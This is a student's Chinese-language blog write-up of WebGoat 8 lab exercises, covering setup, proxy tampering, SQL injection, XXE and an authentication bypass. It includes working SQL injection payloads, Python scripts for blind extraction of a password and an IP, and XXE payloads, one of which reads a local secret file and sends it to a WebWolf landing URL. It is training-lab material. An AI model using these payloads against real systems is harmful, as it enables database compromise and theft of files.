---
title: webgoat
date: 2018-10-16 20:44:52
tags:
thumbnail: "https://s1.ax1x.com/2018/10/17/id8t2j.jpg"
---

新版wp都没有，旧版又太丑，哭唧唧

然鹅网络安全课by兄嘚要我们演示这个，记录一下坑们x

新版wp真的好少，，，就一个英语艰难的老铁在油管发了个视频。。。心累

顺口一提该我演示的这天翘了课去参加PCC技术考察志愿者了，公费旅游加自助餐可海星，与外国友人和一些学长学姐的交流也灰常nice~比在学校里听无聊的课和面对专业认证的专家有意思多了好叭

***

### 安装

下不下来。。。docker又因为docker-compose版本不对各种报错。。。

一个神奇的童鞋却能下，，，直接执行就好 `java -jar webgoat-server-8.0.0.VERSION.jar [--server.port=8080] [--server.address=localhost]` webwolf也一样，端口换成9090就好

然后如果你要用bp而且它也用8080的话得在浏览器（窝用的插件）和bp设置那都改，血的教训QAQ

### introduction

#### webwolf

要都打开再在webgoat里注册后那个账号才能在webgoat里登录~个人感觉webwolf就像傻瓜版vps一样

### general

#### HTTP Proxies

按它的几个要点改了很久（微笑

最后发现两个坑：

- 改为get方式参数就得跟在路径后了，可以直接使用bp的修改request方式来自动更改
- Change the input value 'changeMe' to 'Requests are tampered easily'这句话的意思不系吧参数名改成这个！而是值！！！怀疑自己英语理解能力呜呜呜呜呜呜呜呜呜呜呜呜呜呜呜呜呜呜呜呜

### Injection Flaws

这什么杀马特HSQLDB数据库。。。它用Java已经很不爽了。。。

#### SQL Injection (advanced)

`Dave' union select userid,user_name, password,cookie,null,null,null from user_system_data -- `

（最后加空格）这列数猜的窝，，，pia

真鸡儿糕级。。。表名16位随机根本注不粗好叭？？？源码里还特意加一句注释 `Make it more random at runtime (good luck guessing)` 就是让你猜不到？？？好在它良心发现输出到log里控制台可以看见，于是register里注吖，构造语句为true返回false哒

源码： ` String checkUserQuery = "select userid from " + USERS_TABLE_NAME + " where userid = '" + username_reg + "'";` 

脚本（虽然超想把源码里的密码直接po。。。）：

```
import requests
import json

result=''
url='http://localhost:8080/WebGoat/SqlInjection/challenge'
cookies={
    'JSESSIONID':'xxx',
    '__utma':'xxx',
    'WEBWOLFSESSION':'xxx'
}
a=''
ll=''
for i in range(1,30):
    for j in range(33,127):
        a=ll+chr(j)
        re='tom\' and (select left(password,'+str(i)+') from challenge_users_随机数 where userid=\'tom\')=\''+a+'\'-- '
        data={
            'username_reg':re,
            'email_reg':'a@a',
            'password_reg':'a',
            'confirm_password_reg':'a'
        }
        print(i,a)
        r=requests.put(url=url,cookies=cookies,data=data)
        #print(url,r.content)
        all=json.loads(r.content)
        #print(all["lessonCompleted"])
        if(all["lessonCompleted"]):
            continue
        else:
            ll+=chr(j)
            break
print(ll)
```

气气，好慢，而且明明都congratulation窝了为什么不给我绿油油的勾勾！气fufu

#### SQL Injection

这顺序到底是怎么想的。。。先难后易

`Smith' or '1'='1  ` 字符型

`101 or 1=1` 数字型

#### SQL Injection (mitigation)

都提示你了注入点不是输入ip那了 `Note: The submit field of this assignment is **NOT** vulnerable for an SQL injection.` 一看这种下意识就排序好叭

这数据库语法真的是mmp，试了半天，啥函数都米有

```
import requests
import json

result=''
url='http://localhost:8080/WebGoat/SqlInjection/servers?column=(case when (select ip from servers where hostname=\'webgoat-dev\')=\'192.168.4.0\' then id else ip end)'
cookies={
    'JSESSIONID':'xxx',
    '__utma':'xxx',
    'WEBWOLFSESSION':'xxx'
}
for i in range(0,10):
    for j in range(0,10):
        ip='192.168.'+str(i)+'.'+str(j)
        #print(ip)
        urll='http://localhost:8080/WebGoat/SqlInjection/servers?column=(case when (select ip from servers where hostname=\'webgoat-dev\')=\''+ip+'\' then id else ip end)'
        r=requests.get(url=urll,cookies=cookies)
        #print(r.content)
        all=json.loads(r.content)
        if(all[0]["id"]=="1"):
            print(ip)
```

~~窝简直是天才~~ 

#### XXE

第一次尝试xxe诶~以前只听嗦过~

按前面的讲解和教程

`<?xml version="1.0" standalone="yes" ?><!DOCTYPE user [<!ENTITY root SYSTEM "file:///"> ]><comment><text>&root;</text></comment>  ` 

爆出好长一段报错

最后查出是 `file:///` 只能用于linux哟~windows下要用 `file:///C:/` 然后还温馨地提示了C盘下不能有中文字符的文件夹？？点开果然系中国人23333顺手一点博客。。。劈头盖脸全是亲子教育，程序猿家长，害啪

第二题是把Content-Type改成application/xml就好惹，因为也会接受xml，惨啊

第三个没回显的。。。mmp

- windows下路径： `c:/Users/{USER}/.webgoat-8.0.0.M21/XXE/secret.txt` 
- 上传到webwolf后文件路径  `http://localhost:9090/files/{username}/{filename}` 
- landing路径 `ip:port/landing` 

```
<?xml version="1.0" encoding="UTF-8"?>
<!ENTITY % file SYSTEM "file:///C:/Users/lenovo/.webgoat-8.0.0.M21/XXE/secret.txt">
<!ENTITY % all "<!ENTITY send SYSTEM 'http://localhost:9090/landing?text=%file;'>"> 
%all;
```

```
<?xml version="1.0"?>
<!DOCTYPE root [
<!ENTITY % remote SYSTEM "http://127.0.0.1:9090/files/QAQQQQ/attack.dtd">
%remote;
]>
<comment>
  <text>test&send;</text>
</comment>
```

第一下各种小细节错各种报错，还是自己不够稳重，唉

### Authentication Flaws

#### Authentication Bypasses

傻瓜操作，改名字，，，窝还多余地改了后面的验证方式。。

***

嗯就做到这儿，，，演示很水。。老师很随意（怀疑他寄几根本没用过webgoat

后面没有动力鞭策着，，米有肾力做了qvq

***

woc要写报告。。。，好的叭，换文明的语言重写一波，再做几题。。